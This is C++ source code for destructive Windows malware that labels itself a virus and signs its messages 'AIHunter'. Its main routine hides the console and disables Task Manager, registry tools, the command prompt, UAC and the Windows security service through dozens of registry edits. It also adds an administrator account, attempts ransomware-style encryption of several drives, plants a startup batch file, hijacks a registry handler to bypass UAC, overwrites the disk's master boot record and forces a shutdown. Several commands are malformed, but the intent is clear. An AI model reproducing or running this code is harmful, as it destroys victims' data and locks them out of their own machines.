#include<iostream>
#include<cstdlib>
#include<ctime>
#include<Windows.h>
#include<cstring> 
#include"fstream"
#include<conio.h>
#include<cmath>
#include<stdio.h>
#include<shlobj.h>

#pragma comment(lib,"winmm.lib")

using namespace std;

void RegTaskmanagerForbidden()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

void RegEditForbidden()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

void RegModifyBackroud()
{
	DWORD value = 1;
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char*)"c://", 3);
	RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
}

BOOL SetImmunity(char* FilePath, char* FileName)
{
	char file[2048] = { 0 };

	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);
	BOOL bRet = CreateDirectory(file, NULL);
	if (bRet)
	{
		strcat(file, "\\anti...\\");
		bRet = CreateDirectory(file, NULL);
		if (bRet)
		{
			SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
			return TRUE;
		}
	}
	return FALSE;
}

void ClearImmunity(char* FilePath, char* FileName)
{
	char file[2048] = { 0 };

	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);

	strcat(file, "\\anti...\\");
	RemoveDirectory(file);

	ZeroMemory(file, MAX_PATH);
	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);
	RemoveDirectory(file);
}

BOOL RebootDelete(char* pszFileName)
{
	char szTemp[MAX_PATH] = "\\\\?\\";
	::lstrcat(szTemp, pszFileName);
	BOOL bRet = ::MoveFileEx(szTemp, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	return bRet;
}

BOOL SetReg(char* lpszExePath)
{
	HKEY hKey = NULL;
	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command",
		0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (NULL == hKey)
	{
		return FALSE;
	}
	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath)));
	::RegCloseKey(hKey);
	return TRUE;
}

unsigned char scode[] = "\x59\x6f\x75\x72\x20\x63\x6f\x6d\x70\x75\x74\x65\x72\x20\x68\x61\x73\x20\x62\x65\x65\x6e\x20\x66\x75\x63\x6b\x65\x64\x20\x62\x79\x20\x41\x49\x48\x75\x6e\x74\x65\x72\x20\x3a\x44";


DWORD writeMBR()
{
	DWORD dwBytesReturned;
	BYTE pMBR[512] = { 0 };


	memcpy(pMBR, scode, sizeof(scode));
	pMBR[510] = 0x55;
	pMBR[511] = 0xaa;


	HANDLE hDevice = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		return -1;
	}


	/*Parameters
	hDevice
	A handle to the volume to be locked. To retrieve a device handle, call the CreateFile function.

	dwIoControlCode
	The control code for the operation. Use FSCTL_LOCK_VOLUME for this operation.

	lpInBuffer
	Not used with this operation; set to NULL.

	nInBufferSize
	Not used with this operation; set to zero.

	lpOutBuffer
	Not used with this operation; set to NULL.

	nOutBufferSize
	Not used with this operation; set to zero.

	lpBytesReturned
	A pointer to a variable that receives the size of the data stored in the output buffer, in bytes. */


	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

	WriteFile(hDevice, pMBR, 512, &dwBytesReturned, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	return 0;
}

int main(int argc, char* argv[]) {
	system("title VirusAlarm");
	cout << "This is a computer virus, do you want to run this program?You know I mean.If you want to run this program,please enter yes.";
	char fuck = getch();
	if (fuck == 'yes') {
		HWND hwnd;
		hwnd = FindWindow("ConsoleWindowClass", NULL);
		if (hwnd)
		{
			ShowWindow(hwnd, SW_HIDE);
		}
		system("rd  f:/ghost.../  /s /q");
		system("reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService /v Start /t REG_DWORD /d 4 /f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v DisableTaskmgr / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoDesktop / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoRun / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoFind / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoControlPanel / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoClose / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoLogOff / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFileMenu /t REG_DWORD /d 1 /f");
		system("reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System / v shutdownwithoutlogon / t REG_DWORD / d 0 / f");
		system("reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLUA / t REG_DWORD / d 0 / f");
		system("reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System / v DisableCMD / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v HideClock / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v HideSCAHealth / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v HideSCANetwork / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v HideSCAPower / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v HideSCAVolume / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoSetTaskbar / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoStartMenuMorePrograms / t REG_DWORD / d 0 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoTrayContextMenu / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v StartMenuLogOff / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v TaskbarLockAll / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoThemesTab / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v NoVisualStyleChoice / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v DisableChangePassword / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v DisableLockWorkstation / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v NoDispAppearancePage / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v NoColorChoice / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoPropertiesMyDocuments / t REG_DWORD / d 1 / f");
		system("reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer / v NoDesktop / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3} / v Restrict_Run / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v DisableRegistryTools / t REG_DWORD / d 1 / f");
		system("reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3} / v Restrict_Run / t REG_DWORD / d 1");
		system("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System / v disableregistrytools / t REG_DWORD / d 1");
		system("net user Administrator dead");
		system("net user Administrator dead /add");
		system("%encryptFile% D:\*.* .dead GetAESKey(256)");
		system("%encryptFile% E:\*.* .dead GetAESKey(256)");
		system("%encryptFile% F:\*.* .dead GetAESKey(256)");
		system("%encryptFile% A:\*.* .dead GetAESKey(256)");
		system("%encryptFile% H:\*.* .dead GetAESKey(256)");
		system("%encryptFile% G:\*.* .dead GetAESKey(256)");
		system("echo @echo off>c:\\windows\\wimn32.bat echo?break?off>>c:\\windows\\wimn32.bat echo ipconfig/release_all>>c:\\windowswimn32.bat echo end>>c:\\windows\\wimn32.bat reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WINDOWsAPI /t reg_sz /d c:\\windows\\wimn32.bat /f reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVision\\Run /v CONTROLexit /t reg_sz /d c:/Windows/wimn32.bat /f Pause");
		writeMBR();
		char* Fuck[4] = { "Äã", "ºÃ", "ÊÀ", "½ç" };
		int FuckLen = sizeof(Fuck) / sizeof(int);

		TCHAR Destop[MAX_PATH];
		SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);

		for (int x = 0; x < FuckLen; x++)
		{
			SetImmunity("c://", Fuck[x]);
		}
		RegTaskmanagerForbidden();
		RegModifyBackroud();
		system("cd desktop");
		system("echo your computer has been fucked by AIHunter :D >> note.txt");
		system("note.txt");
		Sleep(18000);
		BOOL bRet = FALSE;
		PVOID OldValue = NULL;
		::Wow64DisableWow64FsRedirection(&OldValue);
		bRet = SetReg("C:\\Windows\\System32\\cmd.exe");
		::Wow64RevertWow64FsRedirection(OldValue);
		RegEditForbidden();
		system("shutdown -s -t 00");
		return 0;
	}
	else {
		return 0;
	}
}